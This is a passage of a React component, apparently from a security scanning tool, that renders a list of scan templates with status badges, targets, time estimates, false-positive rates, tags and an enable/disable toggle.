                            </Badge>
                            {template.enabled === false && (
                              <Badge variant="outline" className="border-0 bg-gray-500/20 text-gray-300">
                                Disabled
                              </Badge>
                            )}
                            {template.requires_authentication && (
                              <Badge variant="outline" className="border-0 bg-blue-500/20 text-blue-300">
                                Requires Auth
                              </Badge>
                            )}
                          </div>
                          
                          <p className="text-sm mb-3" style={{ color: '#A3CED1' }}>
                            {template.description}
                          </p>

                          <div className="flex items-center gap-4 text-sm" style={{ color: '#7FB8BF' }}>
                            {template.scan_targets && template.scan_targets.length > 0 && (
                              <span>Targets: {template.scan_targets.join(", ")}</span>
                            )}
                            {template.scan_time_estimate && (
                              <span>⏱️ {template.scan_time_estimate}</span>
                            )}
                            {template.false_positive_rate && (
                              <span>FP Rate: {template.false_positive_rate}</span>
                            )}
                          </div>

                          {template.tags && template.tags.length > 0 && (
                            <div className="flex gap-2 mt-3 flex-wrap">
                              {template.tags.map((tag, idx) => (
                                <Badge 
                                  key={idx}
                                  variant="outline" 
                                  className="border-0 bg-indigo-500/20 text-indigo-300"
                                >
                                  <Tag className="w-3 h-3 mr-1" />
                                  {tag}
                                </Badge>
                              ))}
                            </div>
                          )}
                        </div>

                        <div className="flex flex-col gap-2">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={(e) => handleToggleEnabled(template, e)}
                            className="border-[#1E8A9C]"
                            style={{ color: template.enabled !== false ? '#4CAF50' : '#7FB8BF' }}
                          >
                            {template.enabled !== false ? <Eye className="w-4 h-4 mr-2" /> : <EyeOff className="w-4 h-4 mr-2" />}
                            {template.enabled !== false ? 'Enabled' : 'Disabled'}
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      <CreateTemplateDialog
        open={showCreateDialog}
        onOpenChange={setShowCreateDialog}
        onSuccess={loadTemplates}
      />

      <TemplateDetailDialog
        open={showDetailDialog}
        onOpenChange={setShowDetailDialog}
        template={selectedTemplate}
        onSuccess={loadTemplates}
      />
    </div>
  );
}